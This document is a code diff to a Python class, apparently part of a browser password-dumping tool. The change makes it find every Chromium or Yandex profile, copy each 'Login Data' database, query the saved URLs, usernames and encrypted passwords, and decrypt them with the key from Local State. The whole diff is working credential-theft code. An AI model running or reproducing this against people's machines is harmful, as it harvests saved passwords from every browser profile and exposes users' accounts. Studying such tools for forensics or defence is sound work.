@@ -19,56 +19,78 @@ class ChromiumBased:
 
         self.local_state_path = os.path.join(user_data_path, "Local State")
 
-        if self.is_yandex:
-            self.database_path = os.path.join(user_data_path, "Default", "Ya Passman Data")
-        else:
-            self.database_path = os.path.join(user_data_path, "Default", "Login Data")
+        self.database_paths = self._get_database_paths()
 
         indent = " "*4
         self.wrapper = textwrap.TextWrapper(initial_indent=indent, subsequent_indent=indent)
 
+    def _get_database_paths(self):
+        databases = set()
+
+        # Empty string means current dir, without a profile
+        profiles = {'Default', ''}
+
+        for f in os.listdir(self.user_data_path):
+            f_path = os.path.join(self.user_data_path, f)
+            if os.path.isdir(f_path) and "profile" in f.lower():
+                profiles.add(f)
+
+        # Add profiles from Local State
+        with open(self.local_state_path, 'r', encoding='utf-8') as f:
+                data = json.load(f)
+                profiles |= set(data['profile']['info_cache'])
+
+        for profile in profiles:
+            try:
+                files = os.listdir(os.path.join(self.user_data_path, profile))
+            except Exception:
+                continue
+            for db in files:
+                if db.lower() in ['login data', 'ya passman data']:
+                    databases.add(os.path.join(self.user_data_path, profile, db))
+
+        return databases
+
     def get_credentials(self):
         credentials = []
 
-        temp_db = str(uuid.uuid4())
-        shutil.copyfile(self.database_path, temp_db)
+        for db in self.database_paths:
+            temp_db = str(uuid.uuid4())
+            shutil.copyfile(db, temp_db)
 
-        try:
-            conn = sqlite3.connect(temp_db)
+            try:
+                conn = sqlite3.connect(temp_db)
+                curs = conn.cursor()
+                db_query = "SELECT origin_url, username_value, password_value FROM logins"
+                curs.execute(db_query)
+                logins_data = curs.fetchall()
+            except sqlite3.DatabaseError as err:
+                print(self.wrapper.fill("Error with {}: {}".format(db, err)))
+                continue
+            finally:
+                conn.close()
+                os.remove(temp_db)
 
-            curs = conn.cursor()
-            db_query = "SELECT origin_url, username_value, password_value FROM logins"
-            curs.execute(db_query)
+            if not logins_data:
+                continue
 
-            logins_data = curs.fetchall()
-        except sqlite3.DatabaseError as err:
-            print(self.wrapper.fill("Error: {}".format(err)))
-            return credentials
-        finally:
-            conn.close()
-            os.remove(temp_db)
+            key = self._get_key()
 
-        if not logins_data:
-            print(self.wrapper.fill("No credentials found"))
-            return credentials
+            for row in logins_data:
+                url = row[0]
+                username = row[1]
+                encrypted_password = row[2]
 
-        key = self._get_key()
+                password = self._decrypt_password(encrypted_password, key)
 
-        for row in logins_data:
-            url = row[0]
-            username = row[1]
-            encrypted_password = row[2]
-
-            password = self._decrypt_password(encrypted_password, key)
-
-            row = (url, username, password)
-            credentials.append(row)
+                row = (url, username, password)
+                credentials.append(row)
 
         return credentials
 
     def _get_key(self):
-        with open(self.local_state_path, 'r', encoding='utf-8') as file:
-            data = json.load(file)
+        with open(self.local_state_path, 'r', encoding='utf-8') as f:
+            data = json.load(f)
             encrypted_key = data['os_crypt']['encrypted_key']
 
             encrypted_key = base64.b64decode(encrypted_key)
